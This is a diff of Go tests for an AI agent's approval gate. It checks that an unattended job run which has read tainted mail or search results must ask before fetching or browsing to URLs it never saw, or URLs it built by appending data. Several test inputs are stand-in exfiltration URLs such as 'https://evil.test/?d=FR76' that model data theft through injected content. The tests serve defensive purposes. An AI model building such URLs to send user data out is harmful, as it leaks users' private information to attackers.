@@ -10,7 +10,7 @@ import (
 	"github.com/FacileStudio/nacelle"
 )
 
-func TestAJobRunFetchesAnyURLAndWritesArtifactsButKeepsTheShellGated(t *testing.T) {
+func TestATaintedJobRunFollowsSeenLinksAndWritesArtifactsButKeepsTheShellGated(t *testing.T) {
 	g := mailTaintedGate()
 	g.unattend(store.ChannelCron)
 	g.observe(context.Background(), nacelle.HookEvent{Point: nacelle.AfterToolCall, Call: nacelle.Call{Name: "sonar_search"}, Result: linkTable()})
@@ -19,8 +19,8 @@ func TestAJobRunFetchesAnyURLAndWritesArtifactsButKeepsTheShellGated(t *testing.
 			t.Fatalf("a job run must follow link %d from a result unasked", i+1)
 		}
 	}
-	if g.asks(sonarFetchTool, urlInput("https://www.lemonde.fr/economie/")) {
-		t.Fatal("a job run must fetch a URL it never saw unasked")
+	if !g.asks(sonarFetchTool, urlInput("https://www.lemonde.fr/economie/")) {
+		t.Fatal("a tainted job run must ask before fetching a URL it never saw")
 	}
 	if !g.asks(browserNavigateTool, urlInput("https://evil.test/?d=FR76")) {
 		t.Fatal("a job run must still ask before navigating to a URL it never saw")
@@ -34,5 +34,29 @@ func TestAJobRunFetchesAnyURLAndWritesArtifactsButKeepsTheShellGated(t *testing.
 		if !g.asks(tool, json.RawMessage(`{}`)) {
 			t.Errorf("a job run must still ask before %s", tool)
 		}
+	}
+}
+
+func TestACleanJobRunFetchesAnyURLUnasked(t *testing.T) {
+	g := trustGate(nacelle.UserText("fetch the news"))
+	g.unattend(store.ChannelCron)
+	if g.asks(sonarFetchTool, urlInput("https://www.lemonde.fr/economie/")) {
+		t.Fatal("a job run no source tainted must fetch any URL unasked")
+	}
+}
+
+func TestATaintedJobRunAsksForABuiltURLAndNotForTheJobPromptURL(t *testing.T) {
+	g := trustGate(nacelle.UserText("sum up my mail and read https://news.test/daily"))
+	g.unattend(store.ChannelCron)
+	g.observe(context.Background(), nacelle.HookEvent{Point: nacelle.AfterToolCall, Call: nacelle.Call{Name: "courrier_read_thread"},
+		Result: "see https://shop.test/offer"})
+	if !g.asks(sonarFetchTool, urlInput("https://evil.test/?d=FR76")) {
+		t.Fatal("a tainted job run fetched a URL the model built, unasked")
+	}
+	if !g.asks(sonarFetchTool, urlInput("https://shop.test/offer?d=FR76")) {
+		t.Fatal("a seen URL with a query the model added must ask")
+	}
+	if g.asks(sonarFetchTool, urlInput("https://news.test/daily")) || g.asks(sonarFetchTool, urlInput("https://shop.test/offer")) {
+		t.Fatal("a URL from the job prompt or seen verbatim in a result must pass")
 	}
 }
